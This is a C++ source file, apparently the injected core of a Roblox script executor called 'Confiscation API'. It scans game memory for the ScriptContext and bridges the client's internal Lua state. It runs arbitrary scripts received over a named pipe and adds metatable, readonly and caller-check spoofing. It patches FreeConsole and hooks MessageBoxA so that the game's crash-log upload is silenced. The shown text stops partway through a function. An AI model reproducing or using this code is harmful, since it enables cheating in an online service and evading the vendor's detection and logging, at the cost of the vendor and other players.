#include "LuaWrapper.hpp"
#include <stdexcept>
#include <tuple>
#include <typeinfo>
#include <windows.h>
#include <strsafe.h>
#include <string>
#include <iostream>
#include <thread>
#include <vector>
#include <stdio.h>
#include "InternalUI.h"
#include "Util.hpp"
#pragma comment(lib, "wininet.lib")
#include "VMProtectSDK.h"
#pragma comment(lib,"ws2_32.lib")

using namespace std;

DWORD ScriptContext;
DWORD ScriptContextVFTable = Rebase(0x19D1BBC);

void WrapRBX(const char* s)
{
	r_lua_getglobal(RLS, s);
	Wrap(RLS, LS, -1);
	lua_setglobal(LS, s);
	r_lua_pop(RLS, 1);
}
void ConsoleBypass(const char* Name)
{
	DWORD AAAAAAAAAAAAAAA;
	VirtualProtect((PVOID)& FreeConsole, 1, PAGE_EXECUTE_READWRITE, &AAAAAAAAAAAAAAA);
	*(BYTE*)(&FreeConsole) = 0xC3;
	AllocConsole();
	SetConsoleTitleA(Name);
	freopen("CONOUT$", "w", stdout);
	freopen("CONIN$", "r", stdin);
	HWND ConsoleHandle = GetConsoleWindow();
	::SetWindowPos(ConsoleHandle, HWND_TOPMOST, 0, 0, 0, 0, SWP_DRAWFRAME | SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
	::ShowWindow(ConsoleHandle, SW_NORMAL);
}

std::string replace_all1(std::string subject, const std::string& search, const std::string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != std::string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

inline std::string download_url(const std::string& url) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	std::string rtn;

	if (interwebs) {
		HINTERNET url_file = InternetOpenUrlA(interwebs, url.c_str(), NULL, NULL, NULL, NULL);

		if (url_file) {
			char buffer[2000];
			DWORD bytes_read;

			do {
				InternetReadFile(url_file, buffer, 2000, &bytes_read);
				rtn.append(buffer, bytes_read);
				memset(buffer, 0, 2000);
			} while (bytes_read);

			InternetCloseHandle(interwebs);
			InternetCloseHandle(url_file);
			std::string p = replace_all1(rtn, "|n", "\r\n");
			return p;
		}
	}

	InternetCloseHandle(interwebs);
	std::string p = replace_all1(rtn, "|n", "\r\n");
	return p;
}

int custom_loadstring(lua_State* L) {
	if (lua_type(L, -1) != LUA_TSTRING) {
		luaL_error(L, "First arg is a string");
		return 0;
	}
	if (lua_gettop(L) == 0) {
		luaL_error(L, "just one arg needed");
		return 0;
	}
	Wrapper::Execute(std::string(lua_tostring(L, -1)));
	return 0;
}

int httpgetimpl(lua_State* LS) {
	lua_pushstring(LS, download_url(lua_tostring(LS, -1)).c_str());
	return 1;
}

int custom_httpget(lua_State* L) {
	std::string URL = std::string(lua_tostring(L, -1));
	if (URL.find("getauthticket") != string::npos) {
		luaL_error(L, "Auth Ticket Logger detected, Http request canceled.");
		return 0;
	}
	lua_pushstring(L, std::string(download_url(URL)).c_str());
	return 1;
}

DWORD WINAPI luapipe(PVOID lvpParameter)
{
	string WholeScript = "";
	HANDLE hPipe;
	char buffer[999999];
	DWORD dwRead;
	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\ConfiscationPublicApi"),
		PIPE_ACCESS_DUPLEX | PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
		PIPE_WAIT,
		1,
		999999,
		999999,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)
		{
			while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)
			{
				buffer[dwRead] = '\0';
				try {
					try {
						WholeScript = WholeScript + buffer;
					}
					catch (...) {
					}
				}
				catch (std::exception e) {

				}
				catch (...) {

				}
			}
			Wrapper::Execute(WholeScript);
			WholeScript = "";
		}
		DisconnectNamedPipe(hPipe);
	}
}

DWORD WINAPI luacpipe(PVOID lvpParameter)
{
	string WholeScript = "";
	HANDLE hPipe;
	char buffer[999999];
	DWORD dwRead;
	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\ConfiscationPublicApi"),
		PIPE_ACCESS_DUPLEX | PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
		PIPE_WAIT,
		1,
		999999,
		999999,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)
		{
			while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)
			{
				buffer[dwRead] = '\0';
				try {
					try {
						WholeScript = WholeScript + buffer;
					}
					catch (...) {
					}
				}
				catch (std::exception e) {

				}
				catch (...) {

				}
			}
			Wrapper::Execute(WholeScript);
			WholeScript = "";
		}
		DisconnectNamedPipe(hPipe);
	}
}

DWORD WINAPI cmdpipe(PVOID lvpParameter)
{
	string WholeScript = "";
	HANDLE hPipe;
	char buffer[999999];
	DWORD dwRead;
	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\ConfiscationPublicApi"),
		PIPE_ACCESS_DUPLEX | PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
		PIPE_WAIT,
		1,
		999999,
		999999,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)
		{
			while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)
			{
				buffer[dwRead] = '\0';
				try {
					try {
						WholeScript = WholeScript + buffer;
					}
					catch (...) {
					}
				}
				catch (std::exception e) {

				}
				catch (...) {

				}
			}
			Wrapper::Execute(WholeScript);
			WholeScript = "";
		}
		DisconnectNamedPipe(hPipe);
	}
}

namespace Memory {
	bool Compare(const char* pData, const char* bMask, const char* szMask)
	{
		while (*szMask) {
			__try {
				if (*szMask != '?') {
					if (*pData != *bMask) return 0;
				}
				++szMask, ++pData, ++bMask;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				return 0;
			}
		}
		return 1;
	}

	DWORD Scan()
	{
		MEMORY_BASIC_INFORMATION MBI = { 0 };
		SYSTEM_INFO SI = { 0 };
		GetSystemInfo(&SI);
		DWORD Start = (DWORD)SI.lpMinimumApplicationAddress;
		DWORD End = (DWORD)SI.lpMaximumApplicationAddress;
		do
		{
			while (VirtualQuery((void*)Start, &MBI, sizeof(MBI))) {
				if ((MBI.Protect & PAGE_READWRITE) && !(MBI.Protect & PAGE_GUARD) && !(MBI.Protect & 0x90))
				{
					for (DWORD i = (DWORD)(MBI.BaseAddress); i - (DWORD)(MBI.BaseAddress) < MBI.RegionSize; ++i)
					{
						if (Compare((const char*)i, (char*)& ScriptContextVFTable, "xxxx"))
							return i;
					}
				}
				Start += MBI.RegionSize;
			}
		} while (Start < End);
		return 0;
	}
}

int ShowIMGUI(lua_State* LS) {
	ImGUI::Begin();
	return 1;
}

int mouse1press_impl(int rlua_State) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int mouse1release_impl(int rlua_State) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int mouse1click_impl(int rlua_State) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int mouse2press_impl(int rlua_State) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int mouse2release_impl(int rlua_State) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int mouse2click_impl(int rlua_State) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int MouseButton1Down(lua_State* L) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int MouseButton2Down(lua_State* L) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int MouseButton1Up(lua_State* L) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

int MouseButton2Up(lua_State* L) {
	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
	SendInput(1, &input, sizeof(input));
	return 0;
}

INPUT Inputs[1] = { 0 };

int Mouse1Down(lua_State* LS) {
	Inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN;
	SendInput(1, Inputs, sizeof(INPUT));
	return 0;
}

int Mouse1Up(lua_State* L) {
	Inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP;
	SendInput(1, Inputs, sizeof(INPUT));
	return 0;
}

int Mouse2Down(lua_State* L) {
	Inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN;
	SendInput(1, Inputs, sizeof(INPUT));
	return 0;
}

int Mouse2Up(lua_State* L) {
	Inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTUP;
	SendInput(1, Inputs, sizeof(INPUT));
	return 0;
}

int Mouse1Click(lua_State* L) {
	float n = lua_tonumber(L, -1);
	Inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN;
	SendInput(1, Inputs, sizeof(INPUT));
	Sleep(n);
	Inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP;
	SendInput(1, Inputs, sizeof(INPUT));
	return 0;
}

int Mouse2Click(lua_State* L) {
	float n = lua_tonumber(L, -1);
	Inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN;
	SendInput(1, Inputs, sizeof(INPUT));
	Sleep(n);
	Inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP;
	SendInput(1, Inputs, sizeof(INPUT));
	return 0;
}

int MouseScroll(lua_State* L) {
	int amount = lua_tonumber(L, -1);
	Inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_HWHEEL;
	Inputs[0].mi.mouseData = amount;
	SendInput(1, Inputs, sizeof(INPUT));
	Inputs[0].mi.mouseData = NULL;
	return 0;
}



//int system(const char *command); 
//
//int SaveInstance(lua_State* LS)
//{
//   string res = system("java -jar unluac.jar " + lua_tolstring(RLS, -2, NULL).c_str() + " > workspace\\Decompiled.lua");
//   lua_pushstring(LS, res);
//   return 1;
//}

static int Custom_GetObjects(lua_State* L) {
	auto asset = lua_tostring(L, -1);
	auto hold = std::string("return {game:GetService('InsertService'):LoadLocalAsset('") + std::string(asset) + std::string("')}");
	luaL_dostring(L, hold.c_str());
	return 1;
}

string rpall(string subject, const string& search,
	const string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}


int CopyString(lua_State* Ls) {
	const char* str = lua_tostring(Ls, -1);

	int len = strlen(str);
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len + 1);
	void* mem_ptr = GlobalLock(hMem);
	memcpy(mem_ptr, str, len + 1);
	GlobalUnlock(hMem);
	OpenClipboard(NULL);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hMem);
	CloseClipboard();
	return 0;
}

void GetFile(const char* dllName, const char* fileName, char* buffer, int bfSize) {
	GetModuleFileName(GetModuleHandle(dllName), buffer, bfSize);
	if (strlen(fileName) + strlen(buffer) < MAX_PATH) {
		char* pathEnd = strrchr(buffer, '\\');
		strcpy(pathEnd + 1, fileName);
	}
	else {
		*buffer = 0;
	}
}

int luawritefile(lua_State* rlua_State) {
	const char* nameoffile = lua_tostring(rlua_State, -1);
	const char* contentsoffile = lua_tostring(rlua_State, -2);

	char path[MAX_PATH];
	GetFile("Module.dll", "", path, MAX_PATH);

	std::string Lean;
	Lean += path;
	Lean += "Scripts\\";
	Lean += contentsoffile;

	std::ofstream o(Lean.c_str());

	return 1;
}

int custom_readfile(lua_State* rlua_State) {
	const char* nameoffile = lua_tostring(rlua_State, -1);

	char path[MAX_PATH];
	GetFile("Module.dll", "", path, MAX_PATH);

	std::string file;
	file += path;
	file += "Workspace\\";
	file += nameoffile;

	printf(file.c_str());

	string line;
	ifstream myfile(file);
	if (myfile.is_open())
	{
		while (getline(myfile, line))
		{
			lua_pushstring(rlua_State, line.c_str());
		}
		myfile.close();
	}

	return 1;
}

int KeyPress(lua_State* L) {
	WORD key = lua_tonumber(L, -1);
	Inputs[0].ki.wVk = key;
	SendInput(1, Inputs, sizeof(INPUT));
	Inputs[0].ki.wVk = NULL;
	return 0;
}

int KeyRelease(lua_State* L) {
	WORD key = lua_tonumber(L, -1);
	Inputs[0].ki.wVk = key;
	Inputs[0].mi.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, Inputs, sizeof(INPUT));
	Inputs[0].mi.dwFlags = NULL;
	Inputs[0].ki.wVk = NULL;
	return 0;
}

int KeyTap(lua_State* L) {
	WORD key = lua_tonumber(L, -2);
	int delay = lua_tonumber(L, -1);
	Inputs[0].ki.wVk = key;
	SendInput(1, Inputs, sizeof(INPUT));
	Sleep(delay);
	Inputs[0].mi.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, Inputs, sizeof(INPUT));
	Inputs[0].mi.dwFlags = NULL;
	Inputs[0].ki.wVk = NULL;
	return 0;
}

static int EQ(lua_State* Thread) {
	lua_pushboolean(Thread, (*(DWORD*)lua_touserdata(Thread, 1) == *(DWORD*)lua_touserdata(Thread, 2)));
	return 1;
}

void rlua_emptystack(DWORD luaState)
{
	r_lua_settop(luaState, 0);
};

void PushCClosure(const void* func, DWORD n) {
	try {
		r_lua_pushcclosure(RLS, (int)func, n);
	}
	catch (...) {};
}

void rlua_pushobject(DWORD pRobloxState, TValue* value) {
	auto& topa = *(TValue * *)(pRobloxState + top);
	*topa = *value;
	++topa;
}

inline void rlua_getservice(DWORD state, const char* s)
{
	r_lua_getfield(RLS, -10002, "game");
	r_lua_getfield(RLS, -1, "GetService");
	r_lua_pushvalue(RLS, -2);
	r_lua_pushstring(RLS, s);
	r_lua_pcall(RLS, 2, 1, 0);
}


int Debug_GetMetaTable(lua_State* L) {
	if (lua_gettop(L) == 0) {
		luaL_error(L, "'debug.getrawmetatable' needs 1 argument.");
		return 0;
	}
	Wrap(RLS, L, 1);
	if (r_lua_getmetatable(RLS, -1) == 0) {
		lua_pushnil(L);
		return 0;
	}
	UnWrap(L, RLS, -1);
	return 1;
}

int Debug_GetRegistry(lua_State* L) {
	r_lua_pushvalue(RLS, LUA_REGISTRYINDEX);
	return 1;
}

static int Debug_setfenv(lua_State* L) {
	luaL_checktype(L, 2, LUA_TTABLE);
	lua_settop(L, 2);
	if (lua_setfenv(L, 1) == 0)
		luaL_error(L, LUA_QL("setfenv")
			" cannot change environment of given object");
	return 1;
}

static int auxupvalue(lua_State* L, int get) {
	const char* name;
	int n = luaL_checkint(L, 2);
	luaL_checktype(L, 1, LUA_TFUNCTION);
	if (lua_iscfunction(L, 1)) return 0;  /* cannot touch C upvalues from Lua */
	name = get ? lua_getupvalue(L, 1, n) : lua_setupvalue(L, 1, n);
	if (name == NULL) return 0;
	lua_pushstring(L, name);
	lua_insert(L, -(get + 1));
	return get + 1;
}

static int Debug_getupvalue(lua_State* L) {
	return auxupvalue(L, 1);
}

static int Debug_setupvalue(lua_State* L) {
	luaL_checkany(L, 3);
	return auxupvalue(L, 0);
}


static int custom_checkcaller(lua_State* L) {
	r_lua_pushboolean(RLS, true);
	return 1;
}

int CrashRoblox(lua_State* L) {
	exit(10);
	return 0;
}

static lua_State* getthread(lua_State* L, int* arg) {
	if (lua_isthread(L, 1)) {
		*arg = 1;
		return lua_tothread(L, 1);
	}
	else {
		*arg = 0;
		return L;
	}
}

int outputtoconsole(lua_State* L)
{
	std::string LOL = lua_tostring(L, -1);
	std::string kek = "\r\n";
	std::cout << (kek.c_str());
	std::cout << (LOL.c_str());

	return 0;


}

void writeMem(DWORD addr, char* val, int byten) {
	unsigned long oldp;
	VirtualProtect((LPVOID)addr, byten, PAGE_EXECUTE_READWRITE, &oldp);
	memcpy((LPVOID)addr, val, +byten);
	VirtualProtect((LPVOID)addr, byten, oldp, &oldp);
}

int setreadonly(lua_State* L) {
	DWORD index2address = (DWORD)r_lua_index2(RLS, -1);
	*(BYTE*)(*(DWORD*)index2address + 10) = lua_toboolean(L, -1);
	return 0;
}
int metatable_handler(lua_State* L)
{
	UnWrap(L, RLS, lua_upvalueindex(1));
	const char* key = lua_tostring(L, 2);
	r_lua_getmetatable(RLS, -1);
	r_lua_setreadonly(RLS, -1, 0);
	UnWrap(L, RLS, 3);
	r_lua_setfield(RLS, -2, key);

	r_lua_pop(RLS, 2);
	return 0;
}
int getRawMetaTable(lua_State* L)
{
	UnWrap(L, RLS, 1);

	r_lua_getmetatable(RLS, -1);
	r_lua_setreadonly(RLS, -1, 0);

	Wrap(RLS, L, -1);

	lua_newtable(L);
	{
		lua_pushvalue(L, 1);
		lua_pushcclosure(L, metatable_handler, 1);
		lua_setfield(L, -2, "__newindex");
	}
	lua_setmetatable(L, -2);
	return 1;
}

int custom_setreadonly(lua_State* thread) {
	UnWrap(thread, RLS, -2);
	*(BYTE*)(*(DWORD*)r_lua_index2(RLS, -1) + 6) = lua_toboolean(thread, -1);
	Wrap(RLS, thread, -1);
	return 0;
}
//
int createconsole(lua_State* L)
{
	string gay = lua_tostring(L, -1);
	ConsoleBypass(gay.c_str());
	return 0;
}
//int getupvalues(lua_State* L)
//{
//	lua_pushvalue(L, 1);
//	lua_newtable(L);
//
//	int idx = 1;
//	while (true)
//	{
//		const char* name = lua_getupvalue(L, -2, idx);
//
//		if (!name)
//		{
//			break;
//		}
//
//		lua_setfield(L, -2, name);
//		idx++;
//	}
//	return 1;
//}
int print(lua_State* L) {
	string lol = lua_tostring(L, -1);
	r_lua_getglobal(RLS, "print");
	r_lua_pushstring(RLS, lol.c_str());
	r_lua_pcall(RLS, 1, 1, 0);
	r_lua_settop(RLS, 0);
	return 0;
}

static void settabss(lua_State* L, const char* i, const char* v) {
	lua_pushstring(L, v);
	lua_setfield(L, -2, i);
}

static void settabsi(lua_State* L, const char* i, int v) {
	lua_pushinteger(L, v);
	lua_setfield(L, -2, i);
}

static void treatstackoption(lua_State* L, lua_State* L1, const char* fname) {
	if (L == L1) {
		lua_pushvalue(L, -2);
		lua_remove(L, -3);
	}
	else
		lua_xmove(L1, L, 1);
	lua_setfield(L, -2, fname);
}

static int Debug_getinfo(lua_State* L) {
	lua_Debug ar;
	int arg;
	lua_State* L1 = getthread(L, &arg);
	const char* options = luaL_optstring(L, arg + 2, "flnSu");
	if (lua_isnumber(L, arg + 1)) {
		if (!lua_getstack(L1, (int)lua_tointeger(L, arg + 1), &ar)) {
			lua_pushnil(L);  /* level out of range */
			return 1;
		}
	}
	else if (lua_isfunction(L, arg + 1)) {
		lua_pushfstring(L, ">%s", options);
		options = lua_tostring(L, -1);
		lua_pushvalue(L, arg + 1);
		lua_xmove(L, L1, 1);
	}
	else
		return luaL_argerror(L, arg + 1, "function or level expected");
	if (!lua_getinfo(L1, options, &ar))
		return luaL_argerror(L, arg + 2, "invalid option");
	lua_createtable(L, 0, 2);
	if (strchr(options, 'S')) {
		settabss(L, "source", ar.source);
		settabss(L, "short_src", ar.short_src);
		settabsi(L, "linedefined", ar.linedefined);
		settabsi(L, "lastlinedefined", ar.lastlinedefined);
		settabss(L, "what", ar.what);
	}
	if (strchr(options, 'l'))
		settabsi(L, "currentline", ar.currentline);
	if (strchr(options, 'u'))
		settabsi(L, "nups", ar.nups);
	if (strchr(options, 'n')) {
		settabss(L, "name", ar.name);
		settabss(L, "namewhat", ar.namewhat);
	}
	if (strchr(options, 'L'))
		treatstackoption(L, L1, "activelines");
	if (strchr(options, 'f'))
		treatstackoption(L, L1, "func");
	return 1;  /* return table */
}

#define LEVELS1	12
#define LEVELS2	10

static int Debug_traceback(lua_State * L) {
	int level;
	int firstpart = 1;  /* still before eventual `...' */
	int arg;
	lua_State* L1 = getthread(L, &arg);
	lua_Debug ar;
	if (lua_isnumber(L, arg + 2)) {
		level = (int)lua_tointeger(L, arg + 2);
		lua_pop(L, 1);
	}
	else
		level = (L == L1) ? 1 : 0;  /* level 0 may be this own function */
	if (lua_gettop(L) == arg)
		lua_pushliteral(L, "");
	else if (!lua_isstring(L, arg + 1)) return 1;  /* message is not a string */
	else lua_pushliteral(L, "\n");
	lua_pushliteral(L, "stack traceback:");
	while (lua_getstack(L1, level++, &ar)) {
		if (level > LEVELS1 && firstpart) {
			/* no more than `LEVELS2' more levels? */
			if (!lua_getstack(L1, level + LEVELS2, &ar))
				level--;  /* keep going */
			else {
				lua_pushliteral(L, "\n\t...");  /* too many levels */
				while (lua_getstack(L1, level + LEVELS2, &ar))  /* find last levels */
					level++;
			}
			firstpart = 0;
			continue;
		}
		lua_pushliteral(L, "\n\t");
		lua_getinfo(L1, "Snl", &ar);
		lua_pushfstring(L, "%s:", ar.short_src);
		if (ar.currentline > 0)
			lua_pushfstring(L, "%d:", ar.currentline);
		if (*ar.namewhat != '\0')  /* is there a name? */
			lua_pushfstring(L, " in function " LUA_QS, ar.name);
		else {
			if (*ar.what == 'm')  /* main? */
				lua_pushfstring(L, " in main chunk");
			else if (*ar.what == 'C' || *ar.what == 't')
				lua_pushliteral(L, " ?");  /* C function or tail call */
			else
				lua_pushfstring(L, " in function <%s:%d>",
					ar.short_src, ar.linedefined);
		}
		lua_concat(L, lua_gettop(L) - arg);
	}
	lua_concat(L, lua_gettop(L) - arg);
	return 1;
}


int getgenv(lua_State* L) {
	lua_pushvalue(L, LUA_GLOBALSINDEX);
	Wrap(RLS, L, -1);
	return 1;
}

int getreg(lua_State* L) {
	lua_pushvalue(L, LUA_REGISTRYINDEX);
	Wrap(RLS, L, -1);
	return 1;
}

int getrenv(lua_State* L) {
	lua_pushvalue(L, int(RLS));
	Wrap(RLS, L, -1);
	return 1;
}

static int load_aux(lua_State* L, int status) {
	if (status == 0)  /* OK? */
		return 1;
	else {
		lua_pushnil(L);
		lua_insert(L, -2);  /* put before error message */
		return 2;  /* return nil plus error message */
	}
}

static int loadstring(lua_State* L) {
	size_t l;
	const char* s = luaL_checklstring(L, 1, &l);
	const char* chunkname = luaL_optstring(L, 2, s);
	return load_aux(L, luaL_loadbuffer(L, s, l, chunkname));
}

void lua_setfield(DWORD L, int idx, const char* k) {
	r_lua_pushvalue(L, idx);
	if (r_lua_getmetatable(L, -1)) {
		r_lua_getfield(L, -1, "__newindex");
		r_lua_pushvalue(L, -3);
		r_lua_pushstring(L, k);
		r_lua_pushvalue(L, -6);
		r_lua_pop(L, 3);
	}
	else {
		std::cout << "0\n";
		r_lua_pop(L, 1);
		lua_setfield(L, idx, k);
	}
}

static int MoveMouse(lua_State* L) {
	int x = lua_tointeger(L, 1);
	int y = lua_tointeger(L, 2);

	INPUT input;
	input.type = INPUT_MOUSE;
	memset(&input.mi, 0, sizeof(MOUSEINPUT));
	input.mi.dx = x;
	input.mi.dy = y;
	input.mi.dwFlags = MOUSEEVENTF_MOVE;
	SendInput(1, &input, sizeof(INPUT));
	return 1;
}

int MouseMoveRelative(lua_State* L) {
	LONG x = lua_tonumber(L, -2);
	LONG y = lua_tonumber(L, -1);
	POINT p;
	if (GetCursorPos(&p))
	{
		Inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
		Inputs[0].mi.dx = ((p.x + x) * 0xFFFF / GetSystemMetrics(SM_CXSCREEN) + 1);
		Inputs[0].mi.dy = ((p.y + y) * 0xFFFF / GetSystemMetrics(SM_CYSCREEN) + 1);
		SendInput(1, Inputs, sizeof(INPUT));
	}
	return 0;
}

int _PROXO(lua_State* L) {

	return true;
}

#define log_addy_start 0xB838D
int WINAPI h_MessageBox(
	_In_opt_ HWND    hWnd,
	_In_opt_ LPCTSTR lpText,
	_In_opt_ LPCTSTR lpCaption,
	_In_     UINT    uType
) {
	std::string str_lp = lpText;
	std::string str_cap = lpCaption;
	if (str_cap == "Roblox Crash") {
		DWORD log_start = log_addy_start + (DWORD)GetModuleHandleA(NULL);
		DWORD old;
		for (int i = 0; i < 79; i++) {
			VirtualProtect((LPVOID)(log_start + i), 1, PAGE_EXECUTE_READWRITE, &old);
			*(char*)(log_start + i) = 0x90;
			VirtualProtect((LPVOID)(log_start + i), 1, old, &old);
		}
		str_lp = "Confiscation API crashed.. but don't worry! No logs were sent to ROBLOX";
		str_cap = "Confiscation API has crashed";
	}

	wchar_t* str_lp_res = new wchar_t[4096];
	wchar_t* str_cap_res = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, NULL, str_lp.c_str(), -1, str_lp_res, 4096);
	MultiByteToWideChar(CP_ACP, NULL, str_cap.c_str(), -1, str_cap_res, 4096);
	return MessageBoxW(hWnd, str_lp_res, str_cap_res, uType);
}


void InitUploadCheckHook() {
	DWORD o;
	VirtualProtect((LPVOID)& MessageBoxA, 1, PAGE_EXECUTE_READWRITE, &o);
	*(char*)(&MessageBoxA) = 0xE9;
	*(DWORD*)((DWORD)& MessageBoxA + 1) = ((DWORD)& h_MessageBox - (DWORD)& MessageBoxA) - 5;
	VirtualProtect((LPVOID)& MessageBoxA, 1, o, &o);
}


r_TValue* r_gettop(int rlua_State) {
	return *(r_TValue * *)(rlua_State + 16);
}
int setrawmetatable_impl(lua_State* rlua_State) {
	if (r_lua_gettop(RLS) < 2) {
		r_lua_pushboolean(RLS, 0);
		r_lua_pushstring(RLS, "2 or more arguments expected");
		return 2;
	}

	r_TValue* top = r_gettop(RLS);
	r_TValue* obj1 = top - 1;
	r_TValue* obj0 = top - 2;

	if (!(obj0->tt == R_LUA_TTABLE || obj0->tt == R_LUA_TUSERDATA) || !(obj1->tt == R_LUA_TNIL || obj1->tt == R_LUA_TTABLE)) {
		r_lua_pushboolean(RLS, 0);
		r_lua_pushstring(RLS, "bad argument types");
		return 2;
	}

	r_lua_setmetatable(RLS, 1);
	r_lua_pushboolean(RLS, 1);
	return 1;
}

int custom_copyclipboard(lua_State* Ls) {
	string name = lua_tostring(Ls, -1);
	OpenClipboard(0);
	EmptyClipboard();
	HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, name.size());
	if (!hg) {
		CloseClipboard();
	}
	memcpy(GlobalLock(hg), name.c_str(), name.size());
	GlobalUnlock(hg);
	SetClipboardData(CF_TEXT, hg);
	CloseClipboard();
	GlobalFree(hg);
	return 1;
}

void toClipboard(const std::string& s) {
	OpenClipboard(0);
	EmptyClipboard();
	HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, s.size());
	if (!hg) {
		CloseClipboard();
		return;
	}
	memcpy(GlobalLock(hg), s.c_str(), s.size());
	GlobalUnlock(hg);
	SetClipboardData(CF_TEXT, hg);
	CloseClipboard();
	GlobalFree(hg);
}

int fn_toclipboard(lua_State* L) {
	std::string tc = lua_tostring(L, -1);
	toClipboard(tc);
	MessageBoxA(NULL, "Successfully copied to your clipboard!", "Done!", NULL);
	return 0;
}


//int require(lua_State *Ls) {
//	//seti(RLS, 2);
//	Sleep(100);
//	//seti(RLS, 2);
//}

static int custom_require(lua_State* L) {
	auto asset = lua_tostring(L, -1);
	auto hold = std::string("local module = {\"") + std::string(asset) + std::string("\+)} function module:UnpackData(returnedTable)    return unpack(returnedTable) end function module:CondenseData(...)    return {...} end return module");
	luaL_dostring(L, hold.c_str());
	return 1;

}

static int GC(lua_State* Thread) {
	void* UD = lua_touserdata(Thread, 1);
	if (RLS) {
		r_lua_rawgeti(RLS, LUA_REGISTRYINDEX, (int)UD);
		if (r_lua_type(RLS, -1) <= R_LUA_TNIL) {
			lua_pushnil(Thread);
			lua_rawseti(Thread, LUA_REGISTRYINDEX, (int)UD);
		}
	}
	return 0;
}

int getupvalues(lua_State* L)
{
	lua_pushvalue(L, 1);
	lua_newtable(L);

	int idx = 1;
	while (true)
	{
		const char* name = lua_getupvalue(L, -2, idx);

		if (!name)
		{
			break;
		}

